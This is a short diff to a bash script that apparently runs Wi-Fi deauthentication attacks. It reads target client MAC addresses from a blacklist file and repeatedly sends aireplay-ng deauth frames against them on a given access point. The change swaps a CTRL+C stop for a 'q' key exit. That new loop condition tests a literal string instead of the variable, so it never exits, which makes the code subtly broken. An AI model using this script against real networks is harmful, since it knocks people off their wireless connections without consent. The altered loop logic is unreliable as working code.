@@ -28,9 +28,11 @@ while read TGT_MAC
 do
     echo $TGT_MAC
 done < $BLACKLIST_PATH
-echo "Press CTRL+C to terminate..."
-while [ true ]
+echo "Hold 'q' key to terminate..."
+usr_input=""
+while [[ usr_input != "q" ]]
 do
+    read -rsn1 usr_input
     while read TGT_MAC
     do
         aireplay-ng --deauth 1 -c $TGT_MAC -a $1 $2 > /dev/null 2>&1
